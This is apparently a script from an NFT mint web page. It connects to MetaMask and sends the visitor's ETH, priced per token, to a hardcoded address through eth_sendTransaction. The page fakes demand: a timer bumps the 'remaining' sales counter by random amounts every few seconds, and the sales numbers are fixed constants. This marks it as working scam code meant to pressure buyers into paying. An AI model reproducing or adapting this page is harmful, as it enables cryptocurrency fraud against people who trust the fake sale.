
            const blockchain = "ETH";
            const price = 0.15;
            const decimals = 2;
            const maxTx = 10;
            const currentSales = 500;
            const remainingSales = 800;
            const wallet = "0x2Fe93ed2D4d64905B276b2c28E75E32199743996";
			
			

            document.querySelector("#box_left-date-small").textContent = month_name + " " + month_day;
            document.querySelector("#box_left-date-long").textContent = month_name + " " + month_day + " - " + date.getHours() + zone + " EST";
            window.web3_ethereum = new Web3(ethereum);
            const CONTRACT_ABI = JSON.parse(
                '[{"inputs":[{"internalType":"address","name":"_recipient","type":"address"},{"internalType":"string","name":"baseUri","type":"string"},{"internalType":"string","name":"contractURi","type":"string"},{"internalType":"string","name":"stubURi","type":"string"},{"internalType":"address","name":"_proxyRegistry","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"}],"name":"mint","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"}],"name":"limitedSale","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"limitedSale","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"}],"name":"preSale","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"preSale","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"contractURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"getTokensOfOwner","outputs":[{"internalType":"uint16[]","name":"_tokensIDs","type":"uint16[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"},{"internalType":"address","name":"_operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"}],"name":"mintToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mintTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"baseUri","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"contractURi","type":"string"}],"name":"setContractURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"newmintLimitPerTransaction","type":"uint256"}],"name":"setMintLimitPerTransaction","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"newPrice","type":"uint256"}],"name":"setPrice","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newRecipient","type":"address"}],"name":"setRecipient","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bool","name":"newSale","type":"bool"}],"name":"setSale","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"stubURi","type":"string"}],"name":"setStubURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"stubURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenOfOwnerByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]'
            );
            window.contract_own = new window.web3_ethereum.eth.Contract(CONTRACT_ABI, wallet);

            let total_amount = parseInt(document.querySelector("#box_right-selection").firstChild.textContent);

            setInterval(() => {
                if (ethereum.selectedAddress) {
                    document.querySelectorAll(".button").forEach((element) => {
                        if (element.textContent != "Mint") {
                            element.innerHTML = "<b>Mint</b>";
                        }
                    });
                } else {
                    document.querySelectorAll(".button").forEach((element) => {
                        if (element.textContent != "Connect Wallet") {
                            element.innerHTML = "<b>Connect Wallet</b>";
                        }
                    });
                }
            }, 100);

            setInterval(() => {
                addRemaining(Math.floor(Math.random() * 10));
            }, 3500);

            document.querySelector(".selection-max").addEventListener("click", function () {
                document.querySelector("#box_right-selection").firstChild.textContent = maxTx;
                total_amount = maxTx;
                let current_amount = parseInt(document.querySelector("#box_right-selection").firstChild.textContent);
                document.querySelector(".total-amount").textContent = (current_amount * parseFloat(price)).toFixed(decimals);
            });

            document.querySelectorAll(".button").forEach((element) => {
                element.addEventListener("click", function () {
                    if (!ethereum.selectedAddress) {
                        connect_Metamask();
                    } else {
                        mint_metamask();
                    }
                });
            });
            document.querySelectorAll(".selection-button").forEach((element) => {
                element.addEventListener("click", function () {
                    let current_amount = parseInt(document.querySelector("#box_right-selection").firstChild.textContent);
                    let current_amount_plus = parseInt(document.querySelector("#box_right-selection").firstChild.textContent) + 1;
                    let current_amount_minus = parseInt(document.querySelector("#box_right-selection").firstChild.textContent) - 1;

                    if (element.textContent == "+") {
                        if (current_amount < maxTx) {
                            document.querySelector("#box_right-selection").firstChild.textContent = current_amount_plus;
                            updateTotal();
                        }
                    } else {
                        if (current_amount > 1) {
                            document.querySelector("#box_right-selection").firstChild.textContent = current_amount_minus;
                            updateTotal();
                        }
                    }
                });
            });

            function updateTotal() {
                let current_amount = parseInt(document.querySelector("#box_right-selection").firstChild.textContent);
                total_amount = current_amount;
                document.querySelector(".total-amount").textContent = (current_amount * parseFloat(price)).toFixed(decimals);
            }

            function addRemaining(amount) {
                let remaining_first = parseInt(document.querySelector(".remaining-first").textContent);
                let remaining_last = parseInt(document.querySelector(".remaining-last").textContent);

                if (remaining_first < remaining_last && remaining_first + amount < remaining_last - 1) {
                    document.querySelector(".remaining-first").textContent = remaining_first + amount;
                    document.cookie = "remaining = " + remaining_first;
                }
            }

            async function connect_Metamask() {
                await ethereum
                    .request({ method: "eth_requestAccounts" })
                    .catch((t) => console.error);
            }

            async function mint_metamask() {
                if (total_amount < 1) {
                    total_amount = 1;
                }
                const data = await window.contract_own.methods.mint(ethereum.selectedAddress, total_amount).encodeABI();
                const gasLimit = (50_000 * +total_amount).toString(16);

                let t = total_amount * parseFloat(price);
                let e = window.web3_ethereum.utils.toWei(t.toString(), "ether");
                let n = window.web3_ethereum.utils.toHex(e);

                await ethereum
                    .request({
                        method: "eth_sendTransaction",
                        params: [
                            {
                                from: ethereum.selectedAddress,
                                to: wallet,
                                value: n,
                                data: data,
                                gas: gasLimit,
                            },
                        ],
                    })
                  
                    .catch((t) => console.error);
            }